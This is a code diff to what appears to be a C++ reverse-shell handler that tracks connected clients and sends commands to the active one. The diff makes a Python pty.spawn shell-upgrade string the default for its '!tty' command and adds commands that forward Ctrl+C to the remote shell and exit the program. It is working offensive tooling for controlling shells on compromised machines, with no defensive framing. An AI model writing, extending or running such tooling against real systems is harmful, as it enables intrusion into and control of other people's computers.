@@ -27,8 +27,10 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <unordered_map>
+#include "signalManager.h"
 
 #define INVALID_SOCKET -1
+
 
 std::string first_numberstring(std::string const& str){
 	char const* digits = "0123456789";
@@ -43,6 +45,8 @@ std::string first_numberstring(std::string const& str){
 
 void ServerQueries_t(std::shared_ptr<ClientsManager> clientManager_ptr) {
 	
+	blockSIGINT(); // Block SIGINT for this thread
+
 	while (true) {
 
 		std::string input_cmd;
@@ -64,6 +68,9 @@ void ServerQueries_t(std::shared_ptr<ClientsManager> clientManager_ptr) {
 			else if (!(input_cmd.compare(0, std::string("!tty").length(), std::string("!tty")))) {
     			std::string ttyOption = input_cmd.substr(std::string("!tty").length());
     			ttyOption.erase(0, ttyOption.find_first_not_of(" \t")); // Trim leading spaces
+				if(ttyOption.empty()){
+					ttyOption = "py3";		// default to python3 if not specified
+				}
 				const std::unordered_map<std::string, std::string> ttyCommands = {
 					{"py", "python -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n"},
 					{"py3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n"},
@@ -75,6 +82,13 @@ void ServerQueries_t(std::shared_ptr<ClientsManager> clientManager_ptr) {
 					const std::string& tty = it->second;
 					::send(clientManager_ptr->getActiveClientSocket(), tty.c_str(), tty.size(), 0);
 				}
+			}
+			else if (!(input_cmd.compare(0, std::string("!ctrlc").length(), std::string("!ctrlc")))) {
+				char ctrl_c = 0x03; // ASCII for Ctrl+C
+				::send(clientManager_ptr->getActiveClientSocket(), &ctrl_c, 1, 0);
+			}
+			else if (!(input_cmd.compare(0, std::string("!quit").length(), std::string("!quit")))) {
+				exit(0);	// terminate program
 			}
 			else {
 				printUsageExamples();
